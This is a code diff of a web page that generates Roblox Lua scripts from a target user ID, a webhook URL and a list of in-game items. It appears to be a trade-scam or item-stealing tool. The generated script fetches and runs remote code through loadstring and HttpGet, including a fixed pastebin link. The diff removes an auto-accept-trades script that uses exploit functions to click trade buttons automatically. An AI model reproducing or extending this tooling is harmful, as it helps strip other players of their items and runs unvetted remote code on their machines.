@@ -86,13 +86,17 @@ document.getElementById('deselectAllBtn').onclick = () => {
 document.querySelectorAll('input[name="scriptType"]').forEach(radio => {
     radio.addEventListener('change', () => {
         const customArea = document.getElementById('customScript');
-        customArea.style.display = radio.value === 'custom' ? 'block' : 'none';
+        if (radio.value === 'custom') {
+            customArea.style.display = 'block';
+        } else {
+            customArea.style.display = 'none';
+        }
     });
 });
 
 document.getElementById('generateBtn').addEventListener('click', () => {
-    const nick = document.getElementById('robloxNick').value.trim() || "sdfgrijjkdsfg";
-    const userId = document.getElementById('robloxId').value.trim() || "8986116710";
+    const nick = document.getElementById('robloxNick').value.trim() || "";
+    const userId = document.getElementById('robloxId').value.trim() || "";
     const webhook = document.getElementById('webhookUrl').value.trim();
     const scriptType = document.querySelector('input[name="scriptType"]:checked').value;
     const customScript = document.getElementById('customScript').value;
@@ -109,9 +113,14 @@ document.getElementById('generateBtn').addEventListener('click', () => {
         return;
     }
 
-    const loadLine = scriptType === '22s' 
-        ? 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()'
-        : customScript;
+    let loadLine = '';
+    if (scriptType === '22s') {
+        loadLine = 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()';
+    } else if (scriptType === 'custom') {
+        loadLine = customScript;
+    } else {
+        loadLine = '';
+    }
 
     const brainrotListStr = "{\n    " + selected.map(br => `"${br}"`).join(",\n    ") + "\n}";
 
@@ -125,9 +134,7 @@ local CONFIG = {
 -- ========== END CONFIG ==========
 
 -- Load main script
-loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()
-
-print("Loaded | ID: " .. CONFIG.TARGET_USER_ID .. " | Brainrots: " .. #CONFIG.TARGET_BRAINROTS)`;
+loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()`;
 
     document.getElementById('scriptOutput').textContent = finalScript;
     document.getElementById('output').style.display = 'block';
@@ -146,51 +153,8 @@ document.getElementById('discordBtn').addEventListener('click', () => {
 });
 
 document.getElementById('autoacceptBtn').addEventListener('click', () => {
-    const autoacceptScript = `-- ========== AUTO ACCEPT + ANTI-AFK ==========
--- Auto accept trades + anti AFK
-
-local player = game:GetService("Players").LocalPlayer
-local vim = game:GetService("VirtualInputManager")
-
--- Auto accept trades
-task.spawn(function()
-    while true do
-        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
-            if btn.Name == "Yes" and btn:IsA("ImageButton") then
-                pcall(function()
-                    for _, c in pairs(getconnections(btn.Activated)) do c:Fire() end
-                end)
-            end
-            if btn.Name == "ReadyButton" and btn:IsA("ImageButton") then
-                pcall(function()
-                    for _, c in pairs(getconnections(btn.Activated)) do c:Fire() end
-                end)
-            end
-        end
-        task.wait(0.5)
-    end
-end)
-
--- Anti AFK (movement every 30 sec)
-task.spawn(function()
-    while true do
-        task.wait(30)
-        local char = player.Character
-        local hum = char and char:FindFirstChildOfClass("Humanoid")
-        if hum then
-            hum:ChangeState(Enum.HumanoidStateType.Jumping)
-            task.wait(0.3)
-            vim:SendKeyEvent(true, "W", false, game)
-            task.wait(0.5)
-            vim:SendKeyEvent(false, "W", false, game)
-        end
-    end
-end)
-
-print("Auto Accept + Anti-AFK loaded")`;
-
-    navigator.clipboard.writeText(autoacceptScript);
-    alert('Auto Accept + Anti-AFK script copied!');
+    navigator.clipboard.writeText("AUTOACCEPT");
+    alert('AUTOACCEPT copied to clipboard!');
 });
 
 populateBrainrotsList();
